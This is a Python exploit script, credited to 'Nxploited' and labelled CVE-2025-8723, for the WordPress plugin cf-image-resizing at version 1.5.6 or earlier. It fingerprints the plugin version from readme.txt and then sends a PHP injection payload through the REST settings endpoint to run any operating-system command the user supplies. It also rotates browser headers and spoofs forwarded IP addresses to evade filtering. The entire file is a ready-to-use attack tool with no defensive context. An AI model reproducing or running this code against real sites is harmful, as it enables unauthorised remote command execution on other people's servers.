import requests
import argparse
import sys
import re
import random
from urllib.parse import urljoin

#By Khaled Alenazi ( Nxploited )

USER_AGENTS = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0"
]
REFERERS = [
    "https://google.com",
    "https://bing.com",
    "https://yahoo.com",
    "https://duckduckgo.com",
    "https://facebook.com"
]
ORIGINS = [
    "https://google.com",
    "https://bing.com",
    "https://yahoo.com",
    "https://duckduckgo.com"
]
XFF_LIST = [
    "127.0.0.1",
    "1.1.1.1",
    "8.8.8.8",
    "10.10.10.10",
    "192.168.1.100"
]
ACCEPT_LANGS = [
    "en-US,en;q=0.9",
    "ar-SA,ar;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
    "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7"
]

def normalize_url(url):
    if not url.lower().startswith("http"):
        url = "http://" + url
    if not url.endswith("/"):
        url += "/"
    return url

def get_headers():
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": random.choice(ACCEPT_LANGS),
        "Referer": random.choice(REFERERS),
        "Origin": random.choice(ORIGINS),
        "X-Forwarded-For": random.choice(XFF_LIST),
        "X-Real-IP": random.choice(XFF_LIST),
        "Connection": "close",
        "Content-Type": "application/json"
    }
    return headers

def get_readme(url):
    try:
        readme_url = urljoin(url, "wp-content/plugins/cf-image-resizing/readme.txt")
        resp = requests.get(readme_url, headers={"Content-Type": "application/json"}, timeout=10, verify=False, allow_redirects=True)
        if resp.status_code == 404:
            print("[-] readme.txt not found.")
            return None
        if resp.status_code in [301, 302, 403, 401]:
            print(f"[-] Cannot access readme.txt (status: {resp.status_code}).")
            return None
        return resp.text
    except Exception:
        print("[-] Exception while checking readme.txt.")
        return None

def extract_version(text):
    match = re.search(r"Stable tag:\s*([0-9.]+)", text)
    if match:
        return match.group(1)
    return None

def is_vulnerable(ver):
    def ver2tuple(v): return tuple(map(int, v.split(".")))
    try:
        return ver2tuple(ver) <= ver2tuple("1.5.6")
    except:
        return False

def try_exploit(url, cmd, headers, label):
    endpoint = urljoin(url, "wp-json/wp/v2/settings/")
    payload = {"cf_image_resizing_fit": f"'); system('{cmd}'); /*"}
    try:
        resp = requests.post(endpoint, json=payload, headers=headers, timeout=10, verify=False, allow_redirects=True)
        print(f"\n[=] {label} | Status: {resp.status_code}")
        print(resp.text)
        if resp.status_code in [200,201] and cmd in resp.text:
            print("[+] Exploit worked with this method!")
            return True
    except Exception as e:
        print(f"[-] Exception: {e}")
    return False

def exploit_all(url, cmd, attempts=5):
    print("[*] Trying minimal headers (only Content-Type)...")
    headers_min = {"Content-Type": "application/json"}
    if try_exploit(url, cmd, headers_min, "Minimal Headers"):
        return
    print("[*] Trying advanced headers and randomization...")
    for i in range(attempts):
        hdrs = get_headers()
        if try_exploit(url, cmd, hdrs, f"Advanced Try #{i+1}"):
            return
    print("[-] Exploit did not succeed with any method.")

def scan(url):
    readme = get_readme(url)
    if not readme:
        print("[-] Plugin not found or inaccessible.")
        return False
    ver = extract_version(readme)
    if not ver:
        print("[-] Version not detected.")
        return False
    print(f"[+] Detected version: {ver}")
    if is_vulnerable(ver):
        print(f"[+] Target is vulnerable (<=1.5.6). Proceeding with exploit.")
        return True
    print("[-] Target is not vulnerable.")
    return False

def Nxploited():
    print("[+] CVE-2025-8723 Exploit | by Khaled Alenazi (Nxploited)")
    parser = argparse.ArgumentParser(description="CVE-2025-8723 Exploit | by Khaled Alenazi (Nxploited)")
    parser.add_argument("-u", "--url", required=True, help="Target WordPress site URL")
    parser.add_argument("-c", "--command", default="whoami", help="Command to execute (default: whoami)")
    parser.add_argument("--attempts", default=5, type=int, help="Max advanced tries (default: 5)")
    args = parser.parse_args()
    url = normalize_url(args.url)
    if scan(url):
        exploit_all(url, args.command, attempts=args.attempts)

if __name__ == "__main__":
    try:
        Nxploited()
    except KeyboardInterrupt:
        print("\n[-] Interrupted by user.")
        sys.exit(1)
